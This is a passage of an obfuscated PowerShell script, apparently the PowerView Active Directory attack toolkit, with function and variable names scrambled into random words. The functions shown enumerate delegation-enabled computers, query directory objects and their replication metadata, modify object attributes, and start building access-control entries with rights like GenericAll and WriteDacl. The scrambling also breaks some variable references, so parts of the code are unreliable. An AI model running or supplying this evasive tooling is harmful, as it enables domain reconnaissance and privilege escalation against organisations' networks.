        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['SecurityMasks']) { $qbMTjYnI99['SecurityMasks'] = $lGQMWbBj99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        $OXMRHKBa99 = squintest @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            enchantresses -GTbnmZHU99 -BoSaCifq99 $PSBoundParameters
        }
        if ($OXMRHKBa99) {
            $UpOHlfOj99 = ''
            $iNUvqNTo99 = ''
            $NADQIykH99 | Where-Object {$_} | ForEach-Object {
                $xzUuDuRm99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($xzUuDuRm99 -match '^S-1-') {
                    $UpOHlfOj99 += "(objectsid=$xzUuDuRm99)"
                }
                elseif ($xzUuDuRm99 -match '^CN=') {
                    $UpOHlfOj99 += "(distinguishedname=$xzUuDuRm99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $oXGljrha99 = $xzUuDuRm99.SubString($xzUuDuRm99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[beefsteaks] Extracted domain '$oXGljrha99' from '$xzUuDuRm99'"
                        $qbMTjYnI99['Domain'] = $oXGljrha99
                        $OXMRHKBa99 = squintest @SearcherArguments
                        if (-not $OXMRHKBa99) {
                            Write-Warning "[beefsteaks] Unable to retrieve domain searcher for '$oXGljrha99'"
                        }
                    }
                }
                elseif ($xzUuDuRm99.Contains('.')) {
                    $UpOHlfOj99 += "(|(name=$xzUuDuRm99)(dnshostname=$xzUuDuRm99))"
                }
                elseif ($xzUuDuRm99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $PTUZmxXK99 = (([Guid]$xzUuDuRm99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $UpOHlfOj99 += "(objectguid=$PTUZmxXK99)"
                }
                else {
                    $UpOHlfOj99 += "(name=$xzUuDuRm99)"
                }
            }
            if ($UpOHlfOj99 -and ($UpOHlfOj99.Trim() -ne '') ) {
                $iNUvqNTo99 += "(|$UpOHlfOj99)"
            }
            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[beefsteaks] Searching for computers with for unconstrained delegation'
                $iNUvqNTo99 += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[beefsteaks] Searching for computers that are trusted to authenticate for other principals'
                $iNUvqNTo99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[beefsteaks] Searching for printers'
                $iNUvqNTo99 += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[beefsteaks] Searching for computers with SPN: $SPN"
                $iNUvqNTo99 += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[beefsteaks] Searching for computers with operating system: $blbEZMhK99"
                $iNUvqNTo99 += "(operatingsystem=$blbEZMhK99)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[beefsteaks] Searching for computers with service pack: $sXOuralh99"
                $iNUvqNTo99 += "(operatingsystemservicepack=$sXOuralh99)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[beefsteaks] Searching for computers with site name: $cgKWGcFU99"
                $iNUvqNTo99 += "(serverreferencebl=$cgKWGcFU99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[beefsteaks] Using additional LDAP filter: $aWyQQagT99"
                $iNUvqNTo99 += "$aWyQQagT99"
            }
            $LupSsQtq99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $jNRpFlgU99 = $_.Substring(4)
                    $IqWhfNmp99 = [Int]($lzMGacfo99::$jNRpFlgU99)
                    $iNUvqNTo99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$IqWhfNmp99))"
                }
                else {
                    $IqWhfNmp99 = [Int]($lzMGacfo99::$_)
                    $iNUvqNTo99 += "(userAccountControl:1.2.840.113556.1.4.803:=$IqWhfNmp99)"
                }
            }
            $OXMRHKBa99.filter = "(&(samAccountType=805306369)$iNUvqNTo99)"
            Write-Verbose "[beefsteaks] beefsteaks filter string: $($OXMRHKBa99.filter)"
            if ($PSBoundParameters['FindOne']) { $IUnNdChl99 = $OXMRHKBa99.FindOne() }
            else { $IUnNdChl99 = $OXMRHKBa99.FindAll() }
            $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -iEYVPYCX99 $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        $UEyZXQpH99 = $_
                        $UEyZXQpH99.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $UEyZXQpH99 = gelling -IzcJvFdA99 $_.Properties
                        $UEyZXQpH99.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $UEyZXQpH99
                }
            }
            if ($IUnNdChl99) {
                try { $IUnNdChl99.dispose() }
                catch {
                    Write-Verbose "[beefsteaks] Error disposing of the Results object: $_"
                }
            }
            $OXMRHKBa99.dispose()
        }
    }
}
function monologue {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $NADQIykH99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $lGQMWbBj99,
        [Switch]
        $iqiYBoee99,
        [Alias('ReturnOne')]
        [Switch]
        $kCjMYGtw99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $IDXhQhqm99 = [Enum]::GetNames($lzMGacfo99)
        $IDXhQhqm99 = $IDXhQhqm99 | ForEach-Object {$_; "NOT_$_"}
        enchantresses -Name UACFilter -CgJHCaCU99 $IDXhQhqm99 -Type ([array])
    }
    BEGIN {
        $qbMTjYnI99 = @{}
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Properties']) { $qbMTjYnI99['Properties'] = $IzcJvFdA99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['SecurityMasks']) { $qbMTjYnI99['SecurityMasks'] = $lGQMWbBj99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        $cIOgEvOx99 = squintest @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            enchantresses -GTbnmZHU99 -BoSaCifq99 $PSBoundParameters
        }
        if ($cIOgEvOx99) {
            $UpOHlfOj99 = ''
            $iNUvqNTo99 = ''
            $NADQIykH99 | Where-Object {$_} | ForEach-Object {
                $xzUuDuRm99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($xzUuDuRm99 -match '^S-1-') {
                    $UpOHlfOj99 += "(objectsid=$xzUuDuRm99)"
                }
                elseif ($xzUuDuRm99 -match '^(CN|OU|DC)=') {
                    $UpOHlfOj99 += "(distinguishedname=$xzUuDuRm99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $oXGljrha99 = $xzUuDuRm99.SubString($xzUuDuRm99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[monologue] Extracted domain '$oXGljrha99' from '$xzUuDuRm99'"
                        $qbMTjYnI99['Domain'] = $oXGljrha99
                        $cIOgEvOx99 = squintest @SearcherArguments
                        if (-not $cIOgEvOx99) {
                            Write-Warning "[monologue] Unable to retrieve domain searcher for '$oXGljrha99'"
                        }
                    }
                }
                elseif ($xzUuDuRm99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $PTUZmxXK99 = (([Guid]$xzUuDuRm99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $UpOHlfOj99 += "(objectguid=$PTUZmxXK99)"
                }
                elseif ($xzUuDuRm99.Contains('\')) {
                    $lCzXByeX99 = $xzUuDuRm99.Replace('\28', '(').Replace('\29', ')') | upbraids -ZMAhChio99 Canonical
                    if ($lCzXByeX99) {
                        $CKhPZYWa99 = $lCzXByeX99.SubString(0, $lCzXByeX99.IndexOf('/'))
                        $PEicaWON99 = $xzUuDuRm99.Split('\')[1]
                        $UpOHlfOj99 += "(samAccountName=$PEicaWON99)"
                        $qbMTjYnI99['Domain'] = $CKhPZYWa99
                        Write-Verbose "[monologue] Extracted domain '$CKhPZYWa99' from '$xzUuDuRm99'"
                        $cIOgEvOx99 = squintest @SearcherArguments
                    }
                }
                elseif ($xzUuDuRm99.Contains('.')) {
                    $UpOHlfOj99 += "(|(samAccountName=$xzUuDuRm99)(name=$xzUuDuRm99)(dnshostname=$xzUuDuRm99))"
                }
                else {
                    $UpOHlfOj99 += "(|(samAccountName=$xzUuDuRm99)(name=$xzUuDuRm99)(displayname=$xzUuDuRm99))"
                }
            }
            if ($UpOHlfOj99 -and ($UpOHlfOj99.Trim() -ne '') ) {
                $iNUvqNTo99 += "(|$UpOHlfOj99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[monologue] Using additional LDAP filter: $aWyQQagT99"
                $iNUvqNTo99 += "$aWyQQagT99"
            }
            $LupSsQtq99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $jNRpFlgU99 = $_.Substring(4)
                    $IqWhfNmp99 = [Int]($lzMGacfo99::$jNRpFlgU99)
                    $iNUvqNTo99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$IqWhfNmp99))"
                }
                else {
                    $IqWhfNmp99 = [Int]($lzMGacfo99::$_)
                    $iNUvqNTo99 += "(userAccountControl:1.2.840.113556.1.4.803:=$IqWhfNmp99)"
                }
            }
            if ($iNUvqNTo99 -and $iNUvqNTo99 -ne '') {
                $cIOgEvOx99.filter = "(&$iNUvqNTo99)"
            }
            Write-Verbose "[monologue] monologue filter string: $($cIOgEvOx99.filter)"
            if ($PSBoundParameters['FindOne']) { $IUnNdChl99 = $cIOgEvOx99.FindOne() }
            else { $IUnNdChl99 = $cIOgEvOx99.FindAll() }
            $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = gelling -IzcJvFdA99 $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($IUnNdChl99) {
                try { $IUnNdChl99.dispose() }
                catch {
                    Write-Verbose "[monologue] Error disposing of the Results object: $_"
                }
            }
            $cIOgEvOx99.dispose()
        }
    }
}
function paydays {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $NADQIykH99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $qbMTjYnI99 = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['LDAPFilter']) { $qbMTjYnI99['LDAPFilter'] = $aWyQQagT99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['FindOne']) { $qbMTjYnI99['FindOne'] = $kCjMYGtw99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        if ($PSBoundParameters['Properties']) {
            $IyCBeOyo99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $IyCBeOyo99 = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $qbMTjYnI99['Identity'] = $NADQIykH99 }
        monologue @SearcherArguments | ForEach-Object {
            $jVwQymgR99 = $_.Properties['distinguishedname'][0]
            ForEach($LRrUJvlq99 in $_.Properties['msds-replattributemetadata']) {
                $lfesjECG99 = [xml]$LRrUJvlq99 | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($lfesjECG99) {
                    if ($lfesjECG99.pszAttributeName -Match $IyCBeOyo99) {
                        $TVkhXGOk99 = New-Object PSObject
                        $TVkhXGOk99 | Add-Member NoteProperty 'ObjectDN' $jVwQymgR99
                        $TVkhXGOk99 | Add-Member NoteProperty 'AttributeName' $lfesjECG99.pszAttributeName
                        $TVkhXGOk99 | Add-Member NoteProperty 'LastOriginatingChange' $lfesjECG99.ftimeLastOriginatingChange
                        $TVkhXGOk99 | Add-Member NoteProperty 'Version' $lfesjECG99.dwVersion
                        $TVkhXGOk99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $lfesjECG99.pszLastOriginatingDsaDN
                        $TVkhXGOk99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $TVkhXGOk99
                    }
                }
                else {
                    Write-Verbose "[paydays] Error retrieving 'msds-replattributemetadata' for '$jVwQymgR99'"
                }
            }
        }
    }
}
function batty {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $NADQIykH99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $qbMTjYnI99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['LDAPFilter']) { $qbMTjYnI99['LDAPFilter'] = $aWyQQagT99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        if ($PSBoundParameters['Properties']) {
            $IyCBeOyo99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $IyCBeOyo99 = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $qbMTjYnI99['Identity'] = $NADQIykH99 }
        monologue @SearcherArguments | ForEach-Object {
            $jVwQymgR99 = $_.Properties['distinguishedname'][0]
            ForEach($LRrUJvlq99 in $_.Properties['msds-replvaluemetadata']) {
                $lfesjECG99 = [xml]$LRrUJvlq99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($lfesjECG99) {
                    if ($lfesjECG99.pszAttributeName -Match $IyCBeOyo99) {
                        $TVkhXGOk99 = New-Object PSObject
                        $TVkhXGOk99 | Add-Member NoteProperty 'ObjectDN' $jVwQymgR99
                        $TVkhXGOk99 | Add-Member NoteProperty 'AttributeName' $lfesjECG99.pszAttributeName
                        $TVkhXGOk99 | Add-Member NoteProperty 'AttributeValue' $lfesjECG99.pszObjectDn
                        $TVkhXGOk99 | Add-Member NoteProperty 'TimeCreated' $lfesjECG99.ftimeCreated
                        $TVkhXGOk99 | Add-Member NoteProperty 'TimeDeleted' $lfesjECG99.ftimeDeleted
                        $TVkhXGOk99 | Add-Member NoteProperty 'LastOriginatingChange' $lfesjECG99.ftimeLastOriginatingChange
                        $TVkhXGOk99 | Add-Member NoteProperty 'Version' $lfesjECG99.dwVersion
                        $TVkhXGOk99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $lfesjECG99.pszLastOriginatingDsaDN
                        $TVkhXGOk99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $TVkhXGOk99
                    }
                }
                else {
                    Write-Verbose "[batty] Error retrieving 'msds-replvaluemetadata' for '$jVwQymgR99'"
                }
            }
        }
    }
}
function Buddhists {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $NADQIykH99,
        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $qbMTjYnI99 = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['LDAPFilter']) { $qbMTjYnI99['LDAPFilter'] = $aWyQQagT99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $qbMTjYnI99['Identity'] = $NADQIykH99 }
        $WQvASDDT99 = monologue @SearcherArguments
        ForEach ($Object in $WQvASDDT99) {
            $Entry = $WQvASDDT99.GetDirectoryEntry()
            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[Buddhists] Setting '$($_.Name)' to '$($_.Value)' for object '$($WQvASDDT99.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Buddhists] Error setting/replacing properties for object '$($WQvASDDT99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $BBGbKvqR99 = $_.Name
                        $TmNRQRIk99 = $_.Value
                        Write-Verbose "[Buddhists] XORing '$BBGbKvqR99' with '$TmNRQRIk99' for object '$($WQvASDDT99.Properties.samaccountname)'"
                        $fSGmoBNj99 = $Entry.$BBGbKvqR99[0].GetType().name
                        $zPFLdIzZ99 = $($Entry.$BBGbKvqR99) -bxor $TmNRQRIk99
                        $Entry.$BBGbKvqR99 = $zPFLdIzZ99 -as $fSGmoBNj99
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Buddhists] Error XOR'ing properties for object '$($WQvASDDT99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $BBGbKvqR99 = $_
                        Write-Verbose "[Buddhists] Clearing '$BBGbKvqR99' for object '$($WQvASDDT99.Properties.samaccountname)'"
                        $Entry.$BBGbKvqR99.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Buddhists] Error clearing properties for object '$($WQvASDDT99.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}
function prostheses {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $LdArDFNf99
    )
    Begin {
        if($LdArDFNf99.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }
        function multicultural {
            Param (
                [int[]]
                $aHnxOOWk99
            )
            $QfikEtJn99 = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $aHnxOOWk99[$i]
                $xPNHlFSC99 = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')
                $QfikEtJn99[$xPNHlFSC99+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $QfikEtJn99[$xPNHlFSC99+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $QfikEtJn99[$xPNHlFSC99+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $QfikEtJn99[$xPNHlFSC99+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $QfikEtJn99[$xPNHlFSC99+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $QfikEtJn99[$xPNHlFSC99+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $QfikEtJn99[$xPNHlFSC99+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $QfikEtJn99[$xPNHlFSC99+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }
            $QfikEtJn99
        }
    }
    Process {
        $TVkhXGOk99 = @{
            Sunday = multicultural -aHnxOOWk99 $LdArDFNf99[0..2]
            Monday = multicultural -aHnxOOWk99 $LdArDFNf99[3..5]
            Tuesday = multicultural -aHnxOOWk99 $LdArDFNf99[6..8]
            Wednesday = multicultural -aHnxOOWk99 $LdArDFNf99[9..11]
            Thurs = multicultural -aHnxOOWk99 $LdArDFNf99[12..14]
            Friday = multicultural -aHnxOOWk99 $LdArDFNf99[15..17]
            Saturday = multicultural -aHnxOOWk99 $LdArDFNf99[18..20]
        }
        $TVkhXGOk99 = New-Object PSObject -Property $TVkhXGOk99
        $TVkhXGOk99.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $TVkhXGOk99
    }
}
function virtuously {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $lJaHgDll99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ChGAFvwA99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,
        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
